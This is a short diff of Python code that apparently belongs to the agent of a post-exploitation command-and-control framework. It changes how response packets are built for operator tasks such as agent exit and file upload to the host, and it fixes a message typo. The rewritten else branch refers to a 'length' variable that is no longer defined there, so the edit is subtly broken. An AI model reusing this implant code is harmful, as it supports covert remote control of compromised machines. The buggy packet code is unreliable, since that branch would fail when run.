@@ -126,19 +126,18 @@ def build_response_packet(taskingID, packetData, resultID=0):
         |  2   |         2          |    2     |    2    |   4    | <Length>  |
         +------+--------------------+----------+---------+--------+-----------+
     """
-
-    packetType = struct.pack('=H', taskingID)
-    totalPacket = struct.pack('=H', 1)
-    packetNum = struct.pack('=H', 1)
-    resultID = struct.pack('=H', resultID)
     
+    response_packet = ""
+
     if packetData:
-        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8',errors='ignore'))
-        length = struct.pack('=L',len(packetData))
-        return packetType + totalPacket + packetNum + resultID + length + packetData
+        packetData = base64.b64encode(packetData)
+        length = len(packetData)
+        response_packet = struct.pack('HHHHL',taskingID,1,1,resultID,length)
+        response_packet += packetData
     else:
-        length = struct.pack('=L', 0)
-        return packetType + totalPacket + packetNum + resultID + length
+        response_packet = struct.pack('HHHHL',taskingID,1,1,resultID,length)
+    
+    return response_packet
 
 
 def parse_task_packet(packet, offset=0):
@@ -247,6 +246,7 @@ def process_packet(packetType, data, resultID):
     elif packetType == 2:
         # agent exit
 
+        #msg = "[!] Agent %s exiting" %(sessionID)
         send_message(build_response_packet(2, "", resultID))
         agent_exit()
 
@@ -305,7 +305,7 @@ def process_packet(packetType, data, resultID):
             d = decompress()
             dec_data = d.dec_data(raw, cheader=True)
             if not dec_data['crc32_check']:
-                send_message(build_response_packet(0, "[!] WARNING: File upload failed crc32 check during decompressing!.", resultID))
+                send_message(build_response_packet(0, "[!] WARNING: File upload failed crc32 check during decompression!.", resultID))
                 send_message(build_response_packet(0, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check']), resultID))
             f = open(filePath, 'ab')
             f.write(dec_data['data'])
